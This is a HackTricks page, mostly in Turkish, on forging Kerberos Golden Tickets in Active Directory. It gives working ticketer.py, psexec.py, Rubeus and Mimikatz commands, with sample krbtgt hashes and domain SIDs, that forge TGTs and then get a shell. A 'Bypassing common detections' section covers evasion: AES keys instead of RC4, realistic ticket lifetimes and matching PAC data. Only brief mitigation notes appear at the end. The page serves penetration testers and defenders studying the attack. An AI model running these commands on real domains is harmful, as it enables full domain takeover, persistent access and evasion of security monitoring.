# Golden Ticket

{{#include ../../banners/hacktricks-training.md}}

## Golden ticket

Bir **Golden Ticket** saldırısı, **Active Directory (AD) krbtgt hesabının NTLM hash’i** kullanılarak **herhangi bir kullanıcıyı taklit eden meşru bir Ticket Granting Ticket (TGT) oluşturulmasından** oluşur. Bu teknik özellikle avantajlıdır çünkü etki alanı içinde taklit edilen kullanıcı olarak **herhangi bir servise veya makineye erişim sağlar**. **krbtgt hesabının kimlik bilgilerinin hiçbir zaman otomatik olarak güncellenmediğini** unutmamak çok önemlidir.

krbtgt hesabının **NTLM hash’ini elde etmek** için çeşitli yöntemler kullanılabilir. Bu hash, etki alanındaki herhangi bir Domain Controller (DC) üzerinde bulunan **Local Security Authority Subsystem Service (LSASS) prosesi** veya **NT Directory Services (NTDS.dit) dosyasından** çıkarılabilir. Ayrıca, bir **DCsync saldırısı** gerçekleştirmek de bu NTLM hash’ini elde etmenin başka bir yoludur; bu işlem Mimikatz içindeki **lsadump::dcsync module** veya Impacket içindeki **secretsdump.py script** gibi araçlarla yapılabilir. Bu işlemleri gerçekleştirmek için genellikle **domain admin ayrıcalıkları veya benzer düzeyde erişim gerektiğini** vurgulamak önemlidir.

NTLM hash bu amaç için geçerli bir yöntem olsa da, operasyonel güvenlik nedenleriyle **tickets** oluştururken **Advanced Encryption Standard (AES) Kerberos keys (AES128 ve AES256)** kullanılması **şiddetle önerilir**. Bu, modern domain’lerde daha da önemlidir çünkü **RC4 kullanımı kademeli olarak kaldırılmaktadır** ve Kerberos telemetry içinde çok daha belirgin şekilde öne çıkar.
```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
# Rubeus
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_domain_sid> /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

# Example
.\Rubeus.exe golden /rc4:25b2076cda3bfd6209161a6c78a69c1c /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /user:stegosaurus /ptt /ldap /nowrap

#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
### Modern ticket crafting notes

Mümkün olduğunda, **önce LDAP ve SYSVOL sorgulayın** ve ardından ticket'ı manuel olarak uydurmak yerine gerçek domain policy ve user PAC değerlerini kullanarak forge edin:
```bash
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:<username> /ldap /printcmd /nowrap
```
- `/ldap` DC’den kullanıcı, grup, NetBIOS ve policy verilerini ister; bunlar daha gerçekçi bir PAC oluşturmak için kullanılır.
- `/printcmd` alınan PAC alanlarını içeren offline bir command line yazdırır; bu, daha sonra LDAP’e tekrar dokunmadan aynı ticket’ı forge etmek istiyorsanız kullanışlıdır.
- `/extendedupndns` daha yeni `UpnDns` PAC öğelerini ekler; bunlar `samAccountName` ve account SID içerir.
- `/oldpac` daha yeni `Requestor` ve `Attributes` PAC buffer’larını kaldırır; bu esas olarak eski ortamlarla compatibility testing için kullanışlıdır, default tradecraft için değil.

Linux’ta, recent Impacket versions ayrıca daha yeni PAC structures eklemeyi ve realistic validity period ayarlamayı da destekler:
```bash
python3 ticketer.py -aesKey <krbtgt_aes256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-user-id 500 -groups 512,513,518,519 -duration 10 \
-extra-pac administrator
```
- `-duration` **saat** cinsindendir. Varsayılan **10 yıl**dır ve bu dikkat çekicidir.
- `-extra-pac` daha yeni `UPN_DNS` PAC bilgisini ekler.
- `-old-pac` eski PAC düzenini zorlar.
- `-extra-sid`, PAC’in ek SIDs’e ihtiyaç duyduğu durumlarda faydalıdır (örneğin, [SID-History Injection](sid-history-injection.md) içinde kapsanan child-to-parent escalation senaryolarında).

**Bir kez** **golden Ticket injected** ettikten sonra, paylaşılan dosyalara **(C$)** erişebilir ve servisler ile WMI çalıştırabilirsiniz; bu yüzden bir shell elde etmek için **psexec** veya **wmiexec** kullanabilirsiniz (winrm üzerinden shell alamıyor gibi görünüyorsunuz).

### Bypassing common detections

golden ticket tespit etmenin en sık yolu, wire üzerinde **Kerberos traffic** incelemektir. Varsayılan olarak, Mimikatz **TGT’yi 10 yıl için signs** eder; bu da daha sonraki TGS isteklerinde anomali olarak öne çıkar.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Başlangıç offset’ini, süreyi ve maksimum renewal sayısını (hepsi dakika cinsinden) kontrol etmek için `/startoffset`, `/endin` ve `/renewmax` parametrelerini kullanın.
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Ne yazık ki, TGT’nin ömrü 4769’larda loglanmaz, bu yüzden bu bilgiyi Windows event logs içinde bulamazsın. Ancak ilişkilendirebileceğin şey, **öncesinde 4768 olmadan 4769’ların görülmesi**dir. **Bir TGT olmadan TGS istemek mümkün değildir** ve bir TGT’nin verildiğine dair kayıt yoksa, bunun offline olarak forge edildiğini varsayabiliriz.

**Daha yeni Windows build’lerinde**, Event ID’ler **4768** ve **4769** artık çok daha iyi **encryption type telemetry** de sunar. **RC4 (`0x17`)** kullanan forge edilmiş bir TGT/TGS, `krbtgt`, clients ve services zaten AES keys’e sahip olan bir domain’de birkaç yıl öncesine göre çok daha kolay fark edilir. Bu, **AES-backed Golden Tickets** kullanmayı tercih etmek ve domain’in normal Kerberos policy’sini mümkün olduğunca yakından eşleştirmek için bir başka nedendir.

Başka bir OPSEC sorunu da **PAC fidelity**’dir. İmkansız group memberships, eksik yeni PAC buffers veya LDAP ile eşleşmeyen account metadata içeren tickets, defenders PAC içeriğini AD verileriyle doğruladığında daha kolay tespit edilir. Eğer gerçekten bir DC tarafından verilmiş gibi görünen bir TGT’ye ihtiyacın varsa, şunu incele:

{{#ref}}
diamond-ticket.md
{{#endref}}

Persistence için **environmental limits** de vardır. `krbtgt` account’u **2’lik bir password history** tutar, bu yüzden forge edilmiş bir TGT, önceki key ile imzalandıysa **ilk** `krbtgt` reset’inden sonra geçerli kalabilir. Bu nedenle defenders Golden Tickets’ları **`krbtgt`’yi iki kez resetleyerek** ve reset’ler arasında domain’in maksimum ticket lifetime süresi kadar bekleyerek geçersiz kılar.

Bu detection’ı **bypass etmek** için diamond tickets’ı kontrol edin.

### Mitigation

- 4624: Account Logon
- 4672: Admin Logon
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Defenders’ın yapabileceği diğer küçük triklerden biri, default domain administrator account gibi sensitive users için **4769’lar üzerinde alert** vermek ve normalde AES tickets veren domain’lerde `krbtgt` için **RC4 usage** üzerinde alert vermektir.

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password)
- [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../banners/hacktricks-training.md}}
